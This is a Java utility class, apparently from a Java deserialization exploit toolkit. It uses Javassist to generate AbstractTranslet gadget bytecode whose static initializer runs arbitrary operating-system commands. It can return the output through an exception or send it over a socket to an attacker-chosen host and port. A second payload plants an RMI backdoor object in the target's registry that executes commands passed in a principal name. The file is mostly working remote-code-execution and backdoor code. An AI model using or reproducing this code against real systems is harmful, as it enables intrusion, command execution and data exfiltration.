package util;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import payload.PayloadType;

import javax.management.*;
import javax.management.remote.NotificationResult;
import javax.management.remote.rmi.RMIConnection;
import javax.security.auth.Subject;
import java.io.IOException;
import java.io.Serializable;
import java.rmi.MarshalledObject;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.security.Principal;
import java.util.Set;

public class Utils {
    public static final String randomRebindName = "name" + System.nanoTime();

    public static Class<? extends PayloadType> getPayloadClass(final String className) {
        Class<? extends PayloadType> clazz = null;
        try {
            clazz = (Class<? extends PayloadType>) Class.forName(className);
        } catch (Exception e1) {
        }
        if (clazz == null) {
            try {
                return clazz = (Class<? extends PayloadType>) Class
                        .forName("payload." + className);
            } catch (Exception e2) {
            }
        }
        if (clazz != null && !PayloadType.class.isAssignableFrom(clazz)) {
            clazz = null;
        }
        return clazz;
    }

    public static byte[] getPayloadByte(String command, Boolean flag, String... args) throws CannotCompileException, IOException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.get(StubTransletPayload.class.getName());
        String cmd = "Process proc = java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");" +
                "        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));" +
                "        StringBuffer sb = new StringBuffer();" +
                "        String line;" +
                "        while ((line = br.readLine()) != null)" +
                "        {" +
                "            sb.append(line).append(\"\\n\");" +
                "        }" +
                "         String result = \"cmdResult: \" + sb.toString() + \"cmdEnd\";";

        if (flag) {
            cmd = cmd + "java.net.Socket s = null;\n" +
                    "\n" +
                    "        java.io.BufferedWriter  bw = null;\n" +
                    "      \n" +
                    "            s = javax.net.SocketFactory.getDefault().createSocket(\"" + args[0] + "\", " + args[1] + ");\n" +
                    "            s.setKeepAlive(true);\n" +
                    "            s.setTcpNoDelay(true);\n" +
                    "\n" +
                    "            java.io.OutputStream os = s.getOutputStream();\n" +
                    "             bw = new java.io.BufferedWriter(new java.io.OutputStreamWriter(os));\n" +
                    "            bw.write(result);\n" +
                    "            bw.flush();\n" +
                    "            if (bw != null) {\n" +
                    "\n" +
                    "                bw.close();\n" +
                    "            }\n" +
                    "            if (s != null) {\n" +
                    "                s.close();\n" +
                    "            }";
        } else {
            cmd = cmd + "throw new java.lang.InstantiationException(result);";
        }

        cc.makeClassInitializer().insertAfter(cmd);
        String randomName = "rce" + System.nanoTime();
        cc.setName(randomName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        return classBytes;
    }


    public static byte[] getRebindPayloadByte(String port) throws NotFoundException, CannotCompileException, IOException {

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(RMIRebindService.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.get(RMIRebindService.class.getName());

        CtConstructor constructor = cc.getDeclaredConstructor(new CtClass[]{});

        String rebind = "java.rmi.registry.Registry registry = java.rmi.registry.LocateRegistry.getRegistry(\"127.0.0.1\", " + port + ");\n" +
                "                java.rmi.server.UnicastRemoteObject.exportObject(this, 0);\n" +
                "                registry.rebind(\"" + Utils.randomRebindName + "\", this);";

        constructor.insertBeforeBody(rebind);

        String randomName = "rce" + System.nanoTime();
        cc.setName(randomName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] classBytes = cc.toBytecode();
        return classBytes;
    }


    public static class StubTransletPayload extends AbstractTranslet implements Serializable {


        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }


    public static class RMIRebindService extends AbstractTranslet implements RMIConnection, Serializable {


        private static final long serialVersionUID = -863113204252100872L;

        public RMIRebindService() throws IOException {

        }

        @Override
        public String getDefaultDomain(Subject delegationSubject) throws IOException {

            Set<Principal> p = delegationSubject.getPrincipals();
            String command = p.iterator().next().getName();

            java.io.InputStream in = Runtime.getRuntime().exec(command).getInputStream();
            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
            String output = s.next();
            return output;
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }

        @Override
        public String getConnectionId() throws IOException {
            return null;
        }

        @Override
        public void close() throws IOException {

        }

        @Override
        public ObjectInstance createMBean(String className, ObjectName name, Subject delegationSubject) throws ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, IOException {
            return null;
        }

        @Override
        public ObjectInstance createMBean(String className, ObjectName name, ObjectName loaderName, Subject delegationSubject) throws ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, InstanceNotFoundException, IOException {
            return null;
        }

        @Override
        public ObjectInstance createMBean(String className, ObjectName name, MarshalledObject params, String[] signature, Subject delegationSubject) throws ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, IOException {
            return null;
        }

        @Override
        public ObjectInstance createMBean(String className, ObjectName name, ObjectName loaderName, MarshalledObject params, String[] signature, Subject delegationSubject) throws ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, InstanceNotFoundException, IOException {
            return null;
        }

        @Override
        public void unregisterMBean(ObjectName name, Subject delegationSubject) throws InstanceNotFoundException, MBeanRegistrationException, IOException {

        }

        @Override
        public ObjectInstance getObjectInstance(ObjectName name, Subject delegationSubject) throws InstanceNotFoundException, IOException {
            return null;
        }

        @Override
        public Set<ObjectInstance> queryMBeans(ObjectName name, MarshalledObject query, Subject delegationSubject) throws IOException {
            return null;
        }

        @Override
        public Set<ObjectName> queryNames(ObjectName name, MarshalledObject query, Subject delegationSubject) throws IOException {
            return null;
        }

        @Override
        public boolean isRegistered(ObjectName name, Subject delegationSubject) throws IOException {
            return false;
        }

        @Override
        public Integer getMBeanCount(Subject delegationSubject) throws IOException {
            return null;
        }

        @Override
        public Object getAttribute(ObjectName name, String attribute, Subject delegationSubject) throws MBeanException, AttributeNotFoundException, InstanceNotFoundException, ReflectionException, IOException {
            return null;
        }

        @Override
        public AttributeList getAttributes(ObjectName name, String[] attributes, Subject delegationSubject) throws InstanceNotFoundException, ReflectionException, IOException {
            return null;
        }

        @Override
        public void setAttribute(ObjectName name, MarshalledObject attribute, Subject delegationSubject) throws InstanceNotFoundException, AttributeNotFoundException, InvalidAttributeValueException, MBeanException, ReflectionException, IOException {

        }

        @Override
        public AttributeList setAttributes(ObjectName name, MarshalledObject attributes, Subject delegationSubject) throws InstanceNotFoundException, ReflectionException, IOException {
            return null;
        }

        @Override
        public Object invoke(ObjectName name, String operationName, MarshalledObject params, String[] signature, Subject delegationSubject) throws InstanceNotFoundException, MBeanException, ReflectionException, IOException {
            return null;
        }


        @Override
        public String[] getDomains(Subject delegationSubject) throws IOException {
            return new String[0];
        }

        @Override
        public MBeanInfo getMBeanInfo(ObjectName name, Subject delegationSubject) throws InstanceNotFoundException, IntrospectionException, ReflectionException, IOException {
            return null;
        }

        @Override
        public boolean isInstanceOf(ObjectName name, String className, Subject delegationSubject) throws InstanceNotFoundException, IOException {
            return false;
        }

        @Override
        public void addNotificationListener(ObjectName name, ObjectName listener, MarshalledObject filter, MarshalledObject handback, Subject delegationSubject) throws InstanceNotFoundException, IOException {

        }

        @Override
        public void removeNotificationListener(ObjectName name, ObjectName listener, Subject delegationSubject) throws InstanceNotFoundException, ListenerNotFoundException, IOException {

        }

        @Override
        public void removeNotificationListener(ObjectName name, ObjectName listener, MarshalledObject filter, MarshalledObject handback, Subject delegationSubject) throws InstanceNotFoundException, ListenerNotFoundException, IOException {

        }

        @Override
        public Integer[] addNotificationListeners(ObjectName[] names, MarshalledObject[] filters, Subject[] delegationSubjects) throws InstanceNotFoundException, IOException {
            return new Integer[0];
        }

        @Override
        public void removeNotificationListeners(ObjectName name, Integer[] listenerIDs, Subject delegationSubject) throws InstanceNotFoundException, ListenerNotFoundException, IOException {

        }

        @Override
        public NotificationResult fetchNotifications(long clientSequenceNumber, int maxNotifications, long timeout) throws IOException {
            return null;
        }
    }
}
